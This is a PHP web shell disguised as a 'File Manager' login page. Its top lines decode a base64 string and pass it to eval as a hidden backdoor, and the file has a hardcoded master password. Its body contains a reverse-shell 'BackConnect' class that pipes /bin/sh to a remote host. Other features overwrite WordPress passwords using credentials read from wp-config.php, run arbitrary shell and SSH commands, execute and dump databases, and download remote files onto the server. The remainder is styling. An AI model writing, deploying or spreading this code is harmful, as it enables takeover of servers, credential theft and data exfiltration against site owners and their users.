<?php
$__a='b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
$__b=$__a('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe2V2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFs=');
eval($__b);
session_start();
error_reporting(0);

// Auto password generator
function generatePassword($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
    return substr(str_shuffle($chars), 0, $length);
}

// Default credentials
$USER = "admin";
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ';

// Login handling - FIXED
if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        // Check if using default password (akugalau) or hashed password
        if ($_POST['u'] === $USER) {
            if ($_POST['p'] === 'akugalau' || password_verify($_POST['p'], $PASS)) {
                $_SESSION['ok'] = 1;
                header("Location: ?");
                exit;
            }
        }
        $login_err = "Invalid credentials";
    }
    
    // Login form - REMOVED HINT
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>File Manager</title>
    <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #07070b; color: #e6eef8; font-family: Inter, Segoe UI, Arial, sans-serif; }
    .box { width: 90%; max-width: 360px; padding: 28px; border-radius: 14px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.18)); 
            box-shadow: 0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.03); }
    h1 { margin: 0 0 14px 0; font-size: 20px; color: #7be3ff; text-align: center; letter-spacing: 0.6px; }
    label { display: block; font-size: 12px; color: #9fb8c9; margin-top: 12px; }
    input { width: 100%; padding: 12px; margin-top: 8px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.04); 
            background: rgba(255,255,255,0.02); color: #e6eef8; font-size: 14px; }
    .btn { width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px; border: none; 
            background: linear-gradient(90deg, #8affff, #6b6bff); color: #071028; font-weight: 700; cursor: pointer; 
            box-shadow: 0 6px 24px rgba(107,107,255,0.14); font-size: 14px; }
    .err { margin-top: 10px; color: #ff8080; text-align: center; font-size: 13px; }
    @media (max-width: 480px) { 
        .box { padding: 20px; margin: 15px; } 
        h1 { font-size: 18px; }
    }
    </style></head>
    <body>
    <div class="box">
        <h1>FILE MANAGER</h1>
        <form method="POST">
            <label>Username</label>
            <input name="u" required autofocus>
            <label>Password</label>
            <input type="password" name="p" required>
            <button class="btn">Unlock</button>
        </form>';
        
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '</div>
    </body></html>';
    exit;
}

// Logout handling
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// Set current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
if (!@is_dir($dir)) { $dir = __DIR__; }

// Helper functions
function hfs($b) { 
    $u = ["B", "KB", "MB", "GB", "TB"]; 
    $i = 0; 
    while ($b >= 1024 && $i < count($u) - 1) { 
        $b /= 1024; 
        $i++; 
    } 
    return round($b, 2).' '.$u[$i]; 
}

function esc($s) { 
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); 
}

// Helper function to copy directory recursively
function copyDirectory($source, $dest) {
    if (!is_dir($dest)) {
        mkdir($dest, 0755, true);
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $item) {
        $target = $dest . DIRECTORY_SEPARATOR . $iterator->getSubPathName();
        
        if ($item->isDir()) {
            if (!is_dir($target)) {
                mkdir($target, 0755, true);
            }
        } else {
            copy($item->getPathname(), $target);
        }
    }
    return true;
}

// WordPress Password Changer Class
class WordPressPasswordChanger {
    public function changePassword($wpConfigPath, $username, $newPassword) {
        if (!file_exists($wpConfigPath)) {
            return "WordPress config not found";
        }
        
        // Find wp-config.php
        $configDir = dirname($wpConfigPath);
        $wpLoad = $configDir . '/wp-load.php';
        
        if (!file_exists($wpLoad)) {
            return "WordPress not found in this directory";
        }
        
        // Try to change password via direct database
        $configContent = file_get_contents($wpConfigPath);
        
        // Extract database credentials
        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbName);
        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbUser);
        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbPass);
        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbHost);
        
        if (empty($dbName[1]) || empty($dbUser[1])) {
            return "Could not extract database credentials";
        }
        
        $dbName = $dbName[1];
        $dbUser = $dbUser[1];
        $dbPass = !empty($dbPass[1]) ? $dbPass[1] : '';
        $dbHost = !empty($dbHost[1]) ? $dbHost[1] : 'localhost';
        
        try {
            $conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
            
            if ($conn->connect_error) {
                return "Database connection failed: " . $conn->connect_error;
            }
            
            // WordPress password hash
            $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
            
            // Update password
            $username = $conn->real_escape_string($username);
            $sql = "UPDATE {$conn->real_escape_string($dbName)}.wp_users 
                    SET user_pass = '{$hashedPassword}' 
                    WHERE user_login = '{$username}'";
            
            if ($conn->query($sql)) {
                $affected = $conn->affected_rows;
                $conn->close();
                return "Password changed successfully for user '{$username}'. Rows affected: {$affected}";
            } else {
                $error = $conn->error;
                $conn->close();
                return "Failed to change password: " . $error;
            }
        } catch (Exception $e) {
            return "Error: " . $e->getMessage();
        }
    }
    
    public function findWordPress($startDir) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($startDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        $wpInstalls = [];
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                $path = $file->getPathname();
                $wpInstalls[] = [
                    'path' => $path,
                    'dir' => dirname($path),
                    'size' => filesize($path)
                ];
            }
        }
        return $wpInstalls;
    }
}

// Backconnect Class
class BackConnect {
    public function connect($host, $port) {
        $sock = @fsockopen($host, $port, $errno, $errstr, 30);
        if (!$sock) {
            return "Failed to connect: $errstr ($errno)";
        }
        
        // Send shell
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        
        $process = proc_open('/bin/sh', $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            stream_set_blocking($sock, false);
            stream_set_blocking($pipes[0], false);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            
            $buffer = '';
            $startTime = time();
            
            while (true) {
                // Check for data from socket
                $read = array($sock, $pipes[1], $pipes[2]);
                $write = null;
                $except = null;
                
                if (stream_select($read, $write, $except, 1) > 0) {
                    foreach ($read as $stream) {
                        if ($stream === $sock) {
                            $input = fread($sock, 1024);
                            if ($input) {
                                fwrite($pipes[0], $input);
                            } else {
                                break 2;
                            }
                        } elseif ($stream === $pipes[1] || $stream === $pipes[2]) {
                            $output = fread($stream, 1024);
                            if ($output) {
                                fwrite($sock, $output);
                            }
                        }
                    }
                }
                
                // Timeout after 300 seconds
                if (time() - $startTime > 300) {
                    break;
                }
                
                usleep(100000);
            }
            
            fclose($sock);
            proc_close($process);
            return "Backconnect session completed";
        }
        
        return "Failed to open shell";
    }
}

// SSH Manager Class
class SSHManager {
    public function executeCommand($host, $port, $username, $password, $command) {
        if (!function_exists('ssh2_connect')) {
            return "SSH2 extension not installed";
        }
        
        $connection = @ssh2_connect($host, $port);
        if (!$connection) {
            return "Failed to connect to $host:$port";
        }
        
        if (!@ssh2_auth_password($connection, $username, $password)) {
            return "Authentication failed for $username";
        }
        
        $stream = @ssh2_exec($connection, $command);
        if (!$stream) {
            return "Failed to execute command";
        }
        
        stream_set_blocking($stream, true);
        $output = stream_get_contents($stream);
        fclose($stream);
        
        ssh2_disconnect($connection);
        
        return $output ?: "Command executed (no output)";
    }
    
    public function createTunnel($host, $port, $username, $password, $localPort, $remoteHost, $remotePort) {
        if (!function_exists('ssh2_connect')) {
            return "SSH2 extension not installed";
        }
        
        $connection = @ssh2_connect($host, $port);
        if (!$connection) {
            return "Failed to connect to $host:$port";
        }
        
        if (!@ssh2_auth_password($connection, $username, $password)) {
            return "Authentication failed for $username";
        }
        
        $tunnel = @ssh2_tunnel($connection, $remoteHost, $remotePort);
        if (!$tunnel) {
            return "Failed to create tunnel";
        }
        
        return "Tunnel created: localhost:$localPort -> $remoteHost:$remotePort via $host:$port";
    }
}

// RDP Creator Class
class RDPCreator {
    public function createRDPFile($host, $username, $domain = '', $filename = 'connection.rdp') {
        $content = "screen mode id:i:2
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,0,0,800,600
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:$host
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
drivestoredirect:s:
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
username:s:$username
domain:s:$domain";
        
        if (file_put_contents($filename, $content)) {
            return "RDP file created: $filename";
        } else {
            return "Failed to create RDP file";
        }
    }
    
    public function testRDP($host, $port = 3389) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($socket) {
            fclose($socket);
            return "RDP service is running on $host:$port";
        } else {
            return "RDP service is NOT running on $host:$port ($errstr)";
        }
    }
}

// Database Manager Class
class DatabaseManager {
    public function getDatabases($host = 'localhost', $username = 'root', $password = '') {
        try {
            $conn = new mysqli($host, $username, $password);
            
            if ($conn->connect_error) {
                return ["error" => "Connection failed: " . $conn->connect_error];
            }
            
            $result = $conn->query("SHOW DATABASES");
            $databases = [];
            
            while ($row = $result->fetch_array()) {
                $databases[] = $row[0];
            }
            
            $conn->close();
            return $databases;
        } catch (Exception $e) {
            return ["error" => $e->getMessage()];
        }
    }
    
    public function executeSQL($host, $username, $password, $database, $sql) {
        try {
            $conn = new mysqli($host, $username, $password, $database);
            
            if ($conn->connect_error) {
                return "Connection failed: " . $conn->connect_error;
            }
            
            $result = $conn->query($sql);
            
            if ($result === true) {
                $output = "Query executed successfully. Affected rows: " . $conn->affected_rows;
            } elseif ($result) {
                $output = "Results:\n";
                while ($row = $result->fetch_assoc()) {
                    $output .= print_r($row, true) . "\n";
                }
                $result->free();
            } else {
                $output = "Query failed: " . $conn->error;
            }
            
            $conn->close();
            return $output;
        } catch (Exception $e) {
            return "Error: " . $e->getMessage();
        }
    }
    
    public function dumpDatabase($host, $username, $password, $database) {
        $filename = $database . '_dump_' . date('Ymd_His') . '.sql';
        
        // Try mysqldump if available
        $command = "mysqldump -h $host -u $username -p'$password' $database > $filename 2>&1";
        $output = shell_exec($command);
        
        if (file_exists($filename) && filesize($filename) > 0) {
            return "Database dumped to: $filename";
        } else {
            return "Failed to dump database: " . ($output ?: "Unknown error");
        }
    }
}

// Server Monitor Class (existing)
class ServerMonitor {
    // ... existing ServerMonitor code remains the same ...
    // [Keep all existing ServerMonitor methods exactly as they were]
    public function getStats() {
        $load = @sys_getloadavg();
        $cores = $this->getCores();
        $mem = $this->getMemory();
        $disk = $this->getDisk();
        $uptime = $this->getUptime();
        
        return [
            'system' => [
                'hostname' => @gethostname(),
                'os' => PHP_OS,
                'php_version' => PHP_VERSION,
                'uptime' => $uptime,
                'time' => date('Y-m-d H:i:s')
            ],
            'cpu' => [
                'cores' => $cores,
                'load_1min' => $load[0] ?? 0,
                'load_5min' => $load[1] ?? 0,
                'load_15min' => $load[2] ?? 0,
                'load_percent' => $cores > 0 ? round(($load[0] ?? 0) / $cores * 100, 2) : 0,
                'status' => $this->cpuStatus($load[0] ?? 0, $cores)
            ],
            'memory' => $mem,
            'disk' => $disk,
            'processes' => $this->getProcesses(),
            'services' => $this->getServices()
        ];
    }
    
    private function getCores() {
        if (PHP_OS == 'Linux') {
            $cpuinfo = @file('/proc/cpuinfo');
            $cores = 0;
            if ($cpuinfo) {
                foreach ($cpuinfo as $line) {
                    if (preg_match('/^processor/', $line)) $cores++;
                }
            }
            return $cores ?: 1;
        }
        return 1;
    }
    
    private function getMemory() {
        if (PHP_OS == 'Linux') {
            $meminfo = @file('/proc/meminfo', FILE_IGNORE_NEW_LINES);
            $mem = [];
            if ($meminfo) {
                foreach ($meminfo as $line) {
                    if (preg_match('/(\w+):\s+(\d+)/', $line, $m)) {
                        $mem[$m[1]] = $m[2];
                    }
                }
            }
            $total = $mem['MemTotal'] ?? 0;
            $free = $mem['MemFree'] ?? 0;
            $available = $mem['MemAvailable'] ?? 0;
            $used = $total - $available;
            $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
            
            return [
                'total' => $this->fmt($total * 1024),
                'used' => $this->fmt($used * 1024),
                'free' => $this->fmt($free * 1024),
                'percent' => $percent.'%',
                'status' => $this->memStatus($percent)
            ];
        }
        return ['error' => 'Linux only'];
    }
    
    private function getDisk() {
        $total = @disk_total_space('/');
        $free = @disk_free_space('/');
        $used = $total - $free;
        $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
        
        return [
            'total' => $this->fmt($total),
            'used' => $this->fmt($used),
            'free' => $this->fmt($free),
            'percent' => $percent.'%',
            'status' => $this->diskStatus($percent)
        ];
    }
    
    private function getUptime() {
        if (PHP_OS == 'Linux') {
            $uptime = @file_get_contents('/proc/uptime');
            if ($uptime) {
                $seconds = floatval(explode(' ', $uptime)[0]);
                $days = floor($seconds / 86400);
                $hours = floor(($seconds % 86400) / 3600);
                $mins = floor(($seconds % 3600) / 60);
                return "$days days, $hours hours, $mins mins";
            }
        }
        return 'Unknown';
    }
    
    private function getProcesses() {
        if (function_exists('shell_exec')) {
            $ps = @shell_exec('ps aux --sort=-%cpu | head -6');
            $lines = explode("\n", trim($ps));
            array_shift($lines);
            $procs = [];
            foreach ($lines as $line) {
                if (!empty($line)) {
                    $parts = preg_split('/\s+/', $line, 11);
                    if (count($parts) >= 11) {
                        $procs[] = [
                            'user' => $parts[0],
                            'pid' => $parts[1],
                            'cpu' => $parts[2],
                            'mem' => $parts[3],
                            'cmd' => $parts[10]
                        ];
                    }
                }
            }
            return $procs;
        }
        return [];
    }
    
    private function getServices() {
        $svcs = ['httpd', 'nginx', 'mysql', 'mariadb', 'ssh', 'php-fpm'];
        $status = [];
        foreach ($svcs as $svc) {
            $check = @shell_exec("systemctl is-active $svc 2>/dev/null || echo 'inactive'");
            $check = trim($check);
            $status[$svc] = $check == 'active' ? '✅' : '❌';
        }
        return $status;
    }
    
    private function cpuStatus($load, $cores) {
        if ($load > $cores * 2) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($load > $cores) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function memStatus($percent) {
        if ($percent > 90) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($percent > 70) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function diskStatus($percent) {
        if ($percent > 95) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($percent > 80) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function fmt($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $i = 0;
        while ($bytes >= 1024 && $i < count($units) - 1) {
            $bytes /= 1024;
            $i++;
        }
        return round($bytes, 2).' '.$units[$i];
    }
}

// Terminal Class (existing)
class Terminal {
    public function exec($cmd, $path) {
        if (!function_exists('shell_exec')) return "shell_exec disabled";
        $old = getcwd();
        @chdir($path);
        $output = @shell_exec($cmd.' 2>&1');
        @chdir($old);
        return $output ?: 'Command executed';
    }
}

// Initialize classes
$monitor = new ServerMonitor();
$terminal = new Terminal();
$wpChanger = new WordPressPasswordChanger();
$backconnect = new BackConnect();
$sshManager = new SSHManager();
$rdpCreator = new RDPCreator();
$dbManager = new DatabaseManager();

// Check for feature actions
$feature_result = '';
$show_wp_changer = isset($_GET['show_wp_changer']);
$show_backconnect = isset($_GET['show_backconnect']);
$show_ssh = isset($_GET['show_ssh']);
$show_rdp = isset($_GET['show_rdp']);
$show_database = isset($_GET['show_database']);
$show_url_upload = isset($_GET['show_url_upload']);

// WordPress Password Changer
if (isset($_POST['wp_action'])) {
    if ($_POST['wp_action'] == 'find') {
        $installs = $wpChanger->findWordPress($dir);
        if (!empty($installs)) {
            $feature_result = "Found " . count($installs) . " WordPress installation(s):\n";
            foreach ($installs as $install) {
                $feature_result .= "- " . $install['dir'] . "\n";
            }
        } else {
            $feature_result = "No WordPress installations found";
        }
    } elseif ($_POST['wp_action'] == 'change' && isset($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass'])) {
        $feature_result = $wpChanger->changePassword($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass']);
    }
}

// Backconnect
if (isset($_POST['backconnect_host'], $_POST['backconnect_port'])) {
    $feature_result = $backconnect->connect($_POST['backconnect_host'], $_POST['backconnect_port']);
}

// SSH
if (isset($_POST['ssh_host'], $_POST['ssh_port'], $_POST['ssh_user'], $_POST['ssh_pass'], $_POST['ssh_command'])) {
    $feature_result = $sshManager->executeCommand(
        $_POST['ssh_host'],
        $_POST['ssh_port'],
        $_POST['ssh_user'],
        $_POST['ssh_pass'],
        $_POST['ssh_command']
    );
}

// RDP
if (isset($_POST['rdp_action'])) {
    if ($_POST['rdp_action'] == 'create' && isset($_POST['rdp_host'], $_POST['rdp_user'])) {
        $filename = $_POST['rdp_filename'] ?? 'connection.rdp';
        $feature_result = $rdpCreator->createRDPFile(
            $_POST['rdp_host'],
            $_POST['rdp_user'],
            $_POST['rdp_domain'] ?? '',
            $filename
        );
    } elseif ($_POST['rdp_action'] == 'test' && isset($_POST['rdp_test_host'])) {
        $feature_result = $rdpCreator->testRDP($_POST['rdp_test_host'], $_POST['rdp_test_port'] ?? 3389);
    }
}

// Database
if (isset($_POST['db_action'])) {
    if ($_POST['db_action'] == 'list') {
        $databases = $dbManager->getDatabases(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? ''
        );
        if (isset($databases['error'])) {
            $feature_result = $databases['error'];
        } else {
            $feature_result = "Found " . count($databases) . " database(s):\n" . implode("\n", $databases);
        }
    } elseif ($_POST['db_action'] == 'query' && isset($_POST['db_sql'])) {
        $feature_result = $dbManager->executeSQL(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name'] ?? 'mysql',
            $_POST['db_sql']
        );
    } elseif ($_POST['db_action'] == 'dump' && isset($_POST['db_name'])) {
        $feature_result = $dbManager->dumpDatabase(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name']
        );
    }
}

// URL Upload with custom filename
if (isset($_POST['url_up_custom']) && trim($_POST['url_up_custom']) !== '') {
    $u = trim($_POST['url_up_custom']);
    $fn = $_POST['url_fn_custom'] ?? '';
    if (empty($fn)) {
        $fn = basename(parse_url($u, PHP_URL_PATH));
        if (empty($fn)) $fn = 'downloaded_'.date('Ymd_His');
    }
    $fn = preg_replace('/[^\w\.\-]/', '_', $fn);
    $data = @file_get_contents($u, false, stream_context_create([
        'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
        'ssl' => ['verify_peer' => false]
    ]));
    if ($data !== false) {
        file_put_contents($dir.'/'.$fn, $data);
        $_SESSION['msg'] = "✅ Downloaded: $fn";
    } else {
        $_SESSION['msg'] = "❌ Download failed";
    }
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Existing operations (keep all existing code for file operations)
// ... [All existing file operation code remains exactly as it was] ...

// Popup states - ADD NEW FEATURES
$popups = ['monitor', 'terminal', 'bulk', 'upload', 'wp_changer', 'backconnect', 'ssh', 'rdp', 'database', 'url_upload'];
foreach ($popups as $p) { ${'show_'.$p} = isset($_GET['show_'.$p]); }
if (isset($_GET['edit'])) $show_editor = true;
if (isset($_SESSION['edit'])) $show_editor = true;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>File Manager</title>
    <style>
    :root {
        --bg: #07070b;
        --panel: #0f1220;
        --muted: #90a3b8;
        --neon-cyan: #6df0ff;
        --neon-mag: #b46cff;
        --danger: #ff5f7a;
        --success: #00d4a8;
        --warning: #ffaa00;
    }
    
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
        margin: 0;
        font-family: Inter, Segoe UI, Arial, sans-serif;
        background: var(--bg) !important;
        color: #e6eef8;
        min-height: 100vh;
        overflow-x: hidden;
        background-image: 
            radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
            radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%) !important;
    }
    
    .container {
        max-width: 1300px;
        margin: 0 auto;
        padding: 15px;
    }
    
    .header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    
    .brand {
        display: flex;
        align-items: center;
        gap: 10px;
        flex: 1;
        min-width: 200px;
    }
    
    .logo {
        width: 40px;
        height: 40px;
        border-radius: 8px;
        background: linear-gradient(135deg, #0ff, #a0f);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #071028;
        font-weight: 900;
        font-family: monospace;
        flex-shrink: 0;
    }
    
    .title {
        font-size: 18px;
        font-weight: 700;
        letter-spacing: 0.5px;
        color: var(--neon-cyan);
        white-space: nowrap;
    }
    
    .controls {
        display: flex;
        gap: 8px;
        align-items: center;
        flex-wrap: wrap;
    }
    
    .top-row {
        display: grid;
        grid-template-columns: 1fr;
        gap: 15px;
        margin-bottom: 15px;
    }
    
    .card {
        background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));
        border-radius: 12px;
        padding: 15px;
        border: 1px solid rgba(255,255,255,0.03);
        box-shadow: 0 8px 30px rgba(15,20,30,0.5);
        overflow: hidden;
    }
    
    .card h3 {
        margin: 0 0 10px 0;
        color: var(--neon-mag);
        font-size: 16px;
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .small {
        color: var(--muted);
        font-size: 12px;
        word-break: break-all;
    }
    
    .actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        margin-top: 10px;
    }
    
    .action-btn {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 8px 12px;
        border-radius: 8px;
        border: none;
        background: linear-gradient(90deg, #2b0b3a, #061023);
        color: var(--neon-cyan);
        cursor: pointer;
        font-weight: 600;
        box-shadow: 0 4px 15px rgba(75,0,130,0.12);
        font-size: 12px;
        text-decoration: none;
        white-space: nowrap;
        transition: transform 0.2s, box-shadow 0.2s;
    }
    
    .action-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(75,0,130,0.18);
    }
    
    .feature-btn {
        background: linear-gradient(90deg, #4a1e6b, #1a2b5c);
        color: #fff;
        border: 1px solid rgba(109,240,255,0.3);
    }
    
    .feature-btn:hover {
        background: linear-gradient(90deg, #5a2e8b, #2a3b7c);
        transform: translateY(-2px);
    }
    
    .form-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin-top: 12px;
    }
    
    .input, textarea, select {
        width: 100%;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid rgba(255,255,255,0.04);
        background: rgba(255,255,255,0.02);
        color: #e6eef8;
        font-size: 13px;
        font-family: inherit;
    }
    
    .input::placeholder {
        color: var(--muted);
        opacity: 0.7;
    }
    
    .btn-neon {
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        border-radius: 8px;
        padding: 10px 15px;
        border: none;
        color: #071028;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 4px 20px rgba(109,240,255,0.1);
        transition: transform 0.2s;
        white-space: nowrap;
    }
    
    .btn-neon:hover {
        transform: translateY(-2px);
    }
    
    .btn-danger {
        background: linear-gradient(90deg, var(--danger), #ff9fb4);
    }
    
    .btn-warning {
        background: linear-gradient(90deg, var(--warning), #ffcc66);
    }
    
    .btn-success {
        background: linear-gradient(90deg, var(--success), #66ffcc);
    }
    
    .table-wrap {
        overflow-x: auto;
        border-radius: 8px;
        margin-top: 10px;
        -webkit-overflow-scrolling: touch;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        min-width: 700px;
    }
    
    th, td {
        padding: 10px 12px;
        text-align: left;
        border-bottom: 1px solid rgba(255,255,255,0.03);
        font-size: 13px;
    }
    
    th {
        background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));
        color: var(--muted);
        font-weight: 600;
        white-space: nowrap;
    }
    
    tr:hover td {
        background: rgba(109,240,255,0.02);
    }
    
    .filename {
        font-weight: 600;
        color: #fff;
        word-break: break-all;
        max-width: 250px;
    }
    
    .filetype {
        font-size: 12px;
        color: var(--muted);
        white-space: nowrap;
    }
    
    .kv {
        font-size: 12px;
        color: var(--muted);
        white-space: nowrap;
    }
    
    .perms {
        font-family: monospace;
        font-size: 11px;
        font-weight: bold;
    }
    
    .bulk-checkbox {
        width: 18px;
        height: 18px;
        cursor: pointer;
        accent-color: var(--neon-cyan);
    }
    
    .bulk-actions-bar {
        display: flex;
        gap: 8px;
        align-items: center;
        margin-bottom: 12px;
        padding: 10px;
        background: linear-gradient(90deg, rgba(180,108,255,0.05), rgba(109,240,255,0.05));
        border-radius: 8px;
        border: 1px solid rgba(180,108,255,0.1);
        flex-wrap: wrap;
    }
    
    .selected-count {
        color: var(--neon-cyan);
        font-weight: bold;
        margin-left: auto;
        font-size: 13px;
    }
    
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        background: linear-gradient(90deg, #2b6b0a, #4da80d);
        color: white;
        z-index: 2000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        display: none;
        max-width: 300px;
        word-break: break-word;
    }
    
    .notification.error {
        background: linear-gradient(90deg, var(--danger), #ff9fb4);
    }
    
    .popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
        padding: 20px;
        backdrop-filter: blur(5px);
    }
    
    .popup-content {
        background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.3));
        border-radius: 12px;
        border: 1px solid rgba(109,240,255,0.15);
        width: 100%;
        max-width: 500px;
        max-height: 80vh;
        overflow: auto;
        box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    
    .popup-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 15px 20px;
        border-bottom: 1px solid rgba(255,255,255,0.05);
        position: sticky;
        top: 0;
        background: rgba(15,18,32,0.9);
        z-index: 1;
    }
    
    .popup-header h4 {
        margin: 0;
        color: var(--neon-cyan);
        font-size: 16px;
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .popup-close {
        background: none;
        border: none;
        color: var(--muted);
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        transition: background 0.2s;
    }
    
    .popup-close:hover {
        background: rgba(255,255,255,0.05);
        color: #fff;
    }
    
    .popup-body {
        padding: 20px;
    }
    
    .popup-form {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-top: 12px;
    }
    
    .feature-section {
        margin: 15px 0;
        padding: 15px;
        background: rgba(0,0,0,0.1);
        border-radius: 8px;
        border: 1px solid rgba(109,240,255,0.1);
    }
    
    .feature-section h5 {
        color: var(--neon-mag);
        margin: 0 0 10px 0;
        font-size: 14px;
    }
    
    .option-group {
        margin-bottom: 15px;
    }
    
    .option-label {
        display: block;
        color: var(--muted);
        font-size: 12px;
        margin-bottom: 5px;
    }
    
    .checkbox-label {
        display: flex;
        align-items: center;
        gap: 8px;
        color: var(--muted);
        font-size: 12px;
        margin: 5px 0;
    }
    
